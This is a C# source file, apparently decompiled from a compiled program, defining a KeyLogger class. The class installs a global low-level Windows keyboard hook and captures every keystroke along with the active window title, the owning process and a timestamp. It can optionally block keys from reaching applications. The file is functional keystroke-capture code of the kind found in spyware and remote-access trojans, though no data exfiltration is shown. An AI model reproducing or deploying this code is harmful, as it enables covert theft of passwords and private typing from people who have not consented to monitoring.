using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

internal class KeyLogger : IDisposable
{
	public delegate void KeyPressedEventHandler(object sender, KeyEventArgs e);

	public delegate void KeyDownEventHandler(object sender, KeyEventArgs e);

	public delegate void KeyUpEventHandler(object sender, KeyEventArgs e);

	public class KeyEventArgs : EventArgs
	{
		public Keys Key;

		public KeyDirection Direction;

		public string StringKey;

		public bool IsSpecialKey;

		public Window Window;

		public DateTime DateTime;

		public KeyEventArgs(Keys Key, KeyDirection Directon, string StringKey, bool IsSpecialKey, Window Window, DateTime DateTime)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			this.Key = Key;
			Direction = Directon;
			this.StringKey = StringKey;
			this.IsSpecialKey = IsSpecialKey;
			this.Window = Window;
			this.DateTime = DateTime;
		}

		public override string ToString()
		{
			return StringKey;
		}
	}

	public class Window
	{
		public string Name;

		public IntPtr Handle;

		public bool Changed;

		public Process Process;

		public Window(string Name, IntPtr Handle, bool Changed, Process Process)
		{
			this.Name = Name;
			this.Handle = Handle;
			this.Changed = Changed;
			this.Process = Process;
		}
	}

	public enum KeyDirection
	{
		Up = 257,
		Down = 256,
		SystemUp = 261,
		SystemDown = 260
	}

	private KeyPressedEventHandler KeyPressedEvent;

	private KeyDownEventHandler KeyDownEvent;

	private KeyUpEventHandler KeyUpEvent;

	private IntPtr hook;

	private API.HookProc deleg;

	private IntPtr tempHandle;

	private bool pass;

	private bool enableSpecialKeys;

	private bool disposedValue;

	public bool PassThrough
	{
		get
		{
			return pass;
		}
		set
		{
			pass = value;
		}
	}

	public bool IncludeSpecialKeys
	{
		get
		{
			return enableSpecialKeys;
		}
		set
		{
			enableSpecialKeys = value;
		}
	}

	public bool IsRunning => hook != IntPtr.Zero;

	public event KeyPressedEventHandler KeyPressed
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyPressedEvent = (KeyPressedEventHandler)Delegate.Combine(KeyPressedEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyPressedEvent = (KeyPressedEventHandler)Delegate.Remove(KeyPressedEvent, value);
		}
	}

	public event KeyDownEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
		}
	}

	public event KeyUpEventHandler KeyUp
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
		}
	}

	public KeyLogger()
	{
		hook = IntPtr.Zero;
		deleg = HookHandler;
		tempHandle = IntPtr.Zero;
		pass = true;
		IncludeSpecialKeys = true;
	}

	public void Start()
	{
		if (!IsRunning)
		{
			hook = API.SetWindowsHookEx(API.HookType.WH_KEYBOARD_LL, deleg, IntPtr.Zero, 0u);
		}
	}

	public void Stop()
	{
		API.UnhookWindowsHookEx(hook);
		hook = IntPtr.Zero;
	}

	public void ResetTitle()
	{
		tempHandle = IntPtr.Zero;
	}

	public Window CurrentWindow()
	{
		return GetCurrentWindow();
	}

	private IntPtr HookHandler(int code, IntPtr wParam, ref API.KBDLLHOOKSTRUCT lParam)
	{
		if (code == 0)
		{
			ProcessKey(wParam, lParam);
		}
		if (pass)
		{
			return API.CallNextHookEx(hook, code, wParam, ref lParam);
		}
		return new IntPtr(1);
	}

	private void ProcessKey(IntPtr wParam, API.KBDLLHOOKSTRUCT lParam)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		Keys key = GetKey(lParam.vkCode);
		KeyDirection keyDirection = GetKeyDirection(wParam);
		Window currentWindow = GetCurrentWindow();
		string text = GetKeyString(currentWindow, lParam);
		bool isSpecialKey = false;
		DateTime messageDate = GetMessageDate(lParam.time);
		string specialKeyString = GetSpecialKeyString(key);
		if (Operators.CompareString(specialKeyString, string.Empty, false) != 0)
		{
			if (!enableSpecialKeys)
			{
				return;
			}
			text = specialKeyString;
			isSpecialKey = true;
		}
		if (!string.IsNullOrEmpty(text))
		{
			RaiseEvents(new KeyEventArgs(key, keyDirection, text, isSpecialKey, currentWindow, messageDate));
		}
	}

	private void RaiseEvents(KeyEventArgs e)
	{
		KeyPressedEvent?.Invoke(this, e);
		switch (e.Direction)
		{
		case KeyDirection.Down:
		case KeyDirection.SystemDown:
			KeyDownEvent?.Invoke(this, e);
			break;
		case KeyDirection.Up:
		case KeyDirection.SystemUp:
			KeyUpEvent?.Invoke(this, e);
			break;
		case (KeyDirection)258:
		case (KeyDirection)259:
			break;
		}
	}

	private Window GetCurrentWindow()
	{
		IntPtr intPtr = API.GetForegroundWindow();
		bool changed = tempHandle != intPtr;
		string name = string.Empty;
		Process process = new Process();
		StringBuilder stringBuilder = new StringBuilder(256);
		if (API.GetWindowText(intPtr, stringBuilder, stringBuilder.Capacity) > 0)
		{
			name = stringBuilder.ToString();
		}
		try
		{
			int lpdwProcessId = 0;
			API.GetWindowThreadProcessId(intPtr, ref lpdwProcessId);
			process = Process.GetProcessById(lpdwProcessId);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		tempHandle = intPtr;
		return new Window(name, intPtr, changed, process);
	}

	private string GetKeyString(Window window, API.KBDLLHOOKSTRUCT @struct)
	{
		StringBuilder stringBuilder = new StringBuilder(4);
		byte[] keyboardState = GetKeyboardState(@struct);
		IntPtr keyboardLayout = GetKeyboardLayout(window);
		if (API.ToUnicodeEx(@struct.vkCode, @struct.scanCode, keyboardState, stringBuilder, stringBuilder.Capacity, 0u, keyboardLayout) != 1)
		{
			return string.Empty;
		}
		return stringBuilder.ToString();
	}

	private IntPtr GetKeyboardLayout(Window window)
	{
		int num = window.Process.Threads[0].Id;
		if (window.Process.Id == Process.GetCurrentProcess().Id)
		{
			num = 0;
		}
		return API.GetKeyboardLayout(checked((uint)num));
	}

	private byte[] GetKeyboardState(API.KBDLLHOOKSTRUCT @struct)
	{
		byte[] array = new byte[255];
		API.GetKeyState(0u);
		API.GetKeyboardState(array);
		return array;
	}

	private string GetSpecialKeyString(Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ec: Expected I4, but got Unknown
		switch (key - 3)
		{
		case 0:
			return "<Cancel>";
		case 5:
			return "<BS>";
		case 6:
			return "<Tab>";
		case 7:
			return "<LineFeed>";
		case 10:
			return "<Enter>";
		case 16:
			return "<Pause/Break>";
		case 17:
			return "<CapsL>";
		case 30:
			return "<PageUp>";
		case 31:
			return "<PageDown>";
		case 32:
			return "<End>";
		case 33:
			return "<Home>";
		case 34:
			return "<LArrow>";
		case 35:
			return "<UArrow>";
		case 36:
			return "<RArrow>";
		case 37:
			return "<DArrow>";
		case 38:
			return "<Select>";
		case 39:
			return "<Print>";
		case 41:
			return "<PrintScreen>";
		case 42:
			return "<Insert>";
		case 43:
			return "<Delete>";
		case 88:
		case 89:
			return "<Windows>";
		case 90:
			return "<Apps>";
		case 109:
			return "<F1>";
		case 110:
			return "<F2>";
		case 111:
			return "<F3>";
		case 112:
			return "<F4>";
		case 113:
			return "<F5>";
		case 114:
			return "<F6>";
		case 115:
			return "<F7>";
		case 116:
			return "<F8>";
		case 117:
			return "<F9>";
		case 118:
			return "<F10>";
		case 119:
			return "<F11>";
		case 120:
			return "<F12>";
		case 141:
			return "<NumL>";
		case 142:
			return "<ScrollL>";
		case 14:
		case 159:
		case 160:
			return "<CTRL>";
		case 15:
		case 161:
		case 162:
			return "<ALT>";
		case 163:
			return "<BrowserBack>";
		case 164:
			return "<BrowserForward>";
		case 165:
			return "<BrowserRefresh>";
		case 166:
			return "<BrowserStop>";
		case 167:
			return "<BrowserSearch>";
		case 168:
			return "<BrowserFavorites>";
		case 169:
			return "<BrowserHome>";
		case 170:
			return "<Mute>";
		case 171:
			return "<Volume->";
		case 172:
			return "<Volume+>";
		case 173:
			return "<NextTrack>";
		case 174:
			return "<PreviousTrac>";
		case 175:
			return "<Stop>";
		case 176:
			return "<Play>";
		case 177:
			return "<Mail>";
		case 179:
			return "<App1>";
		case 180:
			return "<App2>";
		default:
			return string.Empty;
		case 248:
			return "<Zoom>";
		}
	}

	private DateTime GetMessageDate(double messageTime)
	{
		DateTime now = DateTime.Now;
		TimeSpan value = new TimeSpan(checked((long)Math.Round((double)Environment.TickCount + messageTime)));
		return now.Subtract(value);
	}

	private KeyDirection GetKeyDirection(IntPtr input)
	{
		KeyDirection result = (KeyDirection)0;
		try
		{
			result = (KeyDirection)(int)input;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private Keys GetKey(uint input)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		Keys result = (Keys)0;
		try
		{
			result = (Keys)checked((int)input);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	protected virtual void Dispose(bool disposing)
	{
		if (!disposedValue && disposing)
		{
			Stop();
			deleg = null;
		}
		disposedValue = true;
	}

	public void Dispose()
	{
		Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}
}
